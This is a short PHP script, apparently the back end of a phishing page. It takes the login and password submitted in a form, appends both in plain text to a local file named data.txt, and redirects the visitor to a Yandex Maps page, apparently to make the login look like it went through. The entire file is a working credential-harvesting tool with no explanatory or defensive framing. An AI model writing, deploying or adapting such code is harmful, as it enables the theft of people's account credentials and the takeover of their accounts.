<?php

$login = trim($_POST['login']);
$password = trim($_POST['password']);

$fp = fopen('data.txt','a');
fwrite($fp,"login: {$login}\n");
fwrite($fp,"password: {$password}\n");
fwrite($fp,"----------------\n");
fclose($fp);

header('location: https://yandex.ru/maps/?ll=10.551692%2C51.228764&z=6');